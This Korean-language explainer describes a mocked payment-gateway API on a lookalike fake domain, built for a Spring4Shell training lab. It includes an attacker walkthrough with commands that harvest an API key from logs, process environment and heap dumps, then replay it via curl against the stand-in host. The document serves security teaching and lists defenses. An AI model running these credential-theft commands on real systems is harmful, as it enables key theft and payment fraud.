# PG API 시뮬레이션 설명서

## 개요

이 프로젝트는 실제 PG사(토스페이먼츠) API를 **모방한 가짜 API**를 사용합니다.

---

## 🔒 사용된 가짜 PG API 정보

### API 엔드포인트

```java
// 실제 토스페이먼츠: https://api.tosspayments.com
// 가짜 도메인 (존재하지 않음): https://api.tosspaym3nts.com

결제 승인: https://api.tosspaym3nts.com/v1/paym3nts/confirm
결제 취소: https://api.tosspaym3nts.com/v1/paym3nts/{transactionId}/cancel
```

### 차이점

| 실제 토스페이먼츠 | 가짜 도메인 (프로젝트) |
|------------------|----------------------|
| `tosspayments` | `tosspaym3nts` (숫자 3 포함) |
| `/v1/payments` | `/v1/paym3nts` (숫자 3 포함) |
| 실제 작동함 | DNS 조회 실패 (존재하지 않음) |

### API 키 및 인증

```java
// 실제 토스페이먼츠 API 키 형식: test_sk_zXyW9v8u7T6s5R4q3P2o1N0m
API_KEY = "test_sk_zXyW9v8u7T6s5R4q3P2o1N0m"

// 가맹점 ID
MERCHANT_ID = "tosspayments_hyundai_carsharing"

// 인증 방식: Basic Authentication
Authorization: Basic test_sk_zXyW9v8u7T6s5R4q3P2o1N0m
```

---

## 🚨 왜 가짜 도메인을 사용하는가?

### 1. 실제 API 호출 방지

실제 토스페이먼츠 API를 호출하면:
- ❌ 실제 결제가 발생할 수 있음
- ❌ API 키 필요 (실제 계약 필요)
- ❌ 비용 발생 가능
- ❌ 법적 문제 (무단 사용)

### 2. 교육/시연 목적

- ✅ Spring4Shell 취약점 시연에 집중
- ✅ 네트워크 트래픽 분석 (HTTPS)
- ✅ API 키 탈취 시뮬레이션
- ✅ 로그 분석 연습

### 3. 실제 API처럼 동작

```java
// 코드에서는 실제 HTTPS 요청을 준비하지만
// 실제로는 Mock 응답을 반환

// 주석 처리된 실제 호출 코드:
// ResponseEntity<PgPaymentResponse> response = restTemplate.postForEntity(
//     PG_API_URL, entity, PgPaymentResponse.class
// );

// 대신 Mock 응답 반환:
PgPaymentResponse mockResponse = createMockSuccessResponse(...);
```

---

## 📊 로그에 기록되는 내용

### 공격자가 확인할 수 있는 정보

```log
2025-10-31 10:15:32.250 INFO c.s.t.service.PgApiService : === PG API 호출 시작 ===
2025-10-31 10:15:32.251 INFO c.s.t.service.PgApiService : PG API URL: https://api.tosspaym3nts.com/v1/paym3nts/confirm
2025-10-31 10:15:32.252 INFO c.s.t.service.PgApiService : 주문 ID: ORDER_rental-123_1730344532250, 금액: 50000 KRW
2025-10-31 10:15:32.270 INFO c.s.t.service.PgApiService : 요청 헤더: Authorization: Basic test_sk_zX****1N0m
2025-10-31 10:15:32.271 INFO c.s.t.service.PgApiService : 요청 헤더: User-Agent: hyundai-carsharing/1.0
2025-10-31 10:15:32.272 INFO c.s.t.service.PgApiService : 가맹점 ID: tosspayments_hyundai_carsharing
```

### RestTemplate 인터셉터 로그

```log
2025-10-31 10:15:32.500 INFO c.s.t.c.RestTemplateLoggingInterceptor : === RestTemplate 요청 ===
2025-10-31 10:15:32.501 INFO c.s.t.c.RestTemplateLoggingInterceptor : URI: POST https://api.tosspaym3nts.com/v1/paym3nts/confirm
2025-10-31 10:15:32.502 INFO c.s.t.c.RestTemplateLoggingInterceptor : Headers: [Authorization:"Basic ****", User-Agent:"hyundai-carsharing/1.0"]
```

---

## 🔍 공격자 시나리오

### 1. 로그에서 API 정보 탈취

```bash
# EC2 인스턴스에서
grep -r "tosspaym3nts\|test_sk_" /var/log/spring-app/

# 출력:
# PG API URL: https://api.tosspaym3nts.com/v1/paym3nts/confirm
# Authorization: Basic test_sk_zX****1N0m
# 가맹점 ID: tosspayments_hyundai_carsharing
```

### 2. API 키 완전한 값 찾기

```bash
# 마스킹되지 않은 원본 찾기
JAVA_PID=$(pgrep -f java)
sudo cat /proc/$JAVA_PID/environ | tr '\0' '\n' | grep test_sk_

# 또는 메모리 덤프
sudo jmap -dump:format=b,file=/tmp/heap.bin $JAVA_PID
strings /tmp/heap.bin | grep test_sk_

# 결과:
# test_sk_zXyW9v8u7T6s5R4q3P2o1N0m
```

### 3. 탈취한 정보로 직접 API 호출 시도

```bash
# 공격자 PC에서
API_KEY="test_sk_zXyW9v8u7T6s5R4q3P2o1N0m"

curl -X POST https://api.tosspaym3nts.com/v1/paym3nts/confirm \
  -H "Authorization: Basic $API_KEY" \
  -H "Content-Type: application/json" \
  -H "User-Agent: hyundai-carsharing/1.0" \
  -d '{
    "merchantId": "tosspayments_hyundai_carsharing",
    "orderId": "HACKED_ORDER_99999",
    "amount": 1000000,
    "currency": "KRW"
  }'

# 결과:
# curl: (6) Could not resolve host: api.tosspaym3nts.com
# DNS 조회 실패 (도메인이 존재하지 않음)
```

---

## 🌐 네트워크 트래픽 분석

### DNS 조회 실패

```bash
# EC2에서 DNS 조회
nslookup api.tosspaym3nts.com

# 출력:
# ** server can't find api.tosspaym3nts.com: NXDOMAIN
```

### 실제 호출하면 발생하는 로그

```log
# 만약 주석을 해제하고 실제로 RestTemplate.postForEntity()를 호출하면:

2025-10-31 10:15:32.500 ERROR c.s.t.service.PgApiService : PG API 호출 실패: I/O error on POST request for "https://api.tosspaym3nts.com/v1/paym3nts/confirm": api.tosspaym3nts.com; nested exception is java.net.UnknownHostException: api.tosspaym3nts.com
```

### tcpdump로 캡처 시

```bash
# HTTPS 트래픽 모니터링
sudo tcpdump -i eth0 -nn 'port 443'

# 실제 호출 시도 시:
# 1. DNS 쿼리: A? api.tosspaym3nts.com
# 2. DNS 응답: NXDOMAIN (존재하지 않음)
# 3. HTTPS 연결 시도 실패
```

### VPC Flow Logs

```
# 실제 호출 시도 시 (DNS 조회만 발생)
2 123456789012 eni-xxx 10.0.1.50 8.8.8.8 49152 53 17 1 64 1730344532 1730344533 ACCEPT OK
                                    ↑      ↑    ↑
                              Private IP  DNS   UDP

# HTTPS 연결 시도는 발생하지 않음 (DNS 실패로 중단)
```

---

## 💡 실제 PG사 API 비교

### 실제 토스페이먼츠 API

```bash
# 실제 API 엔드포인트
https://api.tosspayments.com/v1/payments/confirm

# 실제 테스트 API 키 (토스페이먼츠 개발자 센터에서 발급)
test_sk_zYX7890vWxUt987SRqp6540ONml3210

# 실제 인증 방식
Authorization: Basic dGVzdF9za196WVg3ODkw...  (Base64 인코딩)

# 실제 응답
{
  "mId": "tosspayments",
  "lastTransactionKey": "9C62D5F5C5E...",
  "paymentKey": "5zJ4xY7m0kODnyRpQWGrN2xqGlNvLrKwv1M9ENjbeoPaZdL6",
  "orderId": "ORDER_2025103110153212345",
  "orderName": "현대 카셰어링 대여료",
  "taxExemptionAmount": 0,
  "status": "DONE",
  "requestedAt": "2025-10-31T10:15:32+09:00",
  "approvedAt": "2025-10-31T10:15:35+09:00",
  "method": "카드",
  "totalAmount": 50000
}
```

### 프로젝트의 가짜 API (Mock)

```bash
# 가짜 API 엔드포인트 (존재하지 않음)
https://api.tosspaym3nts.com/v1/paym3nts/confirm

# 가짜 API 키
test_sk_zXyW9v8u7T6s5R4q3P2o1N0m

# Mock 응답 (코드에서 생성)
{
  "resultCode": "0000",
  "resultMessage": "결제 승인 완료",
  "transactionId": "TXN_a1b2c3d4e5f6g7h8",
  "orderId": "ORDER_rental-123_1730344532500",
  "amount": 50000,
  "currency": "KRW",
  "paymentMethod": "card",
  "status": "APPROVED",
  "approvedAt": "2025-10-31T10:15:32.645",
  "cardCompany": "현대카드",
  "cardNumber": "1234-56**-****-3456",
  "installment": "00"
}
```

---

## 🎯 공격 시연 포인트

### 1. HTTPS 사용 확인

```bash
# 로그에서 HTTPS URL 확인
grep "https://" /var/log/spring-app/*.log

# 출력:
# PG API URL: https://api.tosspaym3nts.com/v1/paym3nts/confirm
```

### 2. API 키 탈취

```bash
# 마스킹된 키 발견
grep "Authorization: Basic" /var/log/spring-app/*.log

# 완전한 키는 메모리나 환경 변수에서 탐색
```

### 3. NAT Gateway 통한 아웃바운드 시도

```bash
# 실제 호출 시도 시 (주석 해제하면)
# NAT Gateway를 통해 외부로 DNS 쿼리 전송
# VPC Flow Logs에 기록됨
```

### 4. 도메인 존재하지 않음 확인

```bash
# DNS 조회 실패로 실제 PG사로 데이터 유출 안됨
nslookup api.tosspaym3nts.com
# NXDOMAIN
```

---

## 🛡️ 보안 시사점

### 공격자가 할 수 있는 것

1. ✅ 로그에서 PG API URL 확인
2. ✅ API 키 일부 확인 (마스킹됨)
3. ✅ 가맹점 ID 확인
4. ✅ 메모리 덤프로 완전한 API 키 탈취
5. ✅ HTTPS 트래픽 발생 확인 (VPC Flow Logs)

### 공격자가 할 수 없는 것

1. ❌ 네트워크 패킷에서 API 키 확인 (HTTPS 암호화)
2. ❌ VPC Flow Logs에서 페이로드 확인 (IP/포트만 기록)
3. ❌ 탈취한 API 키로 실제 결제 (가짜 도메인)

### 방어 방법

1. **API 키를 AWS Secrets Manager에 저장**
2. **로그에서 민감 정보 완전히 마스킹**
3. **메모리 보호** (가능한 경우)
4. **CloudWatch Logs 암호화**
5. **GuardDuty로 이상 행위 탐지**

---

## 📌 요약

- **가짜 도메인**: `api.tosspaym3nts.com` (숫자 3 포함)
- **실제 도메인**: `api.tosspayments.com` (실제 토스페이먼츠)
- **차이점**: 철자가 살짝 다름 (3 vs e)
- **목적**: 안전하게 PG API 호출 시뮬레이션
- **결과**: DNS 조회 실패로 실제 연결 안됨
- **로그**: HTTPS 요청 준비 과정 모두 기록됨
- **교육**: Spring4Shell → root 권한 획득 → API 키 탈취 → 외부 유출 시도 시뮬레이션

**완료!** 이제 실제 PG사 API처럼 보이지만 안전한 가짜 API를 사용합니다.
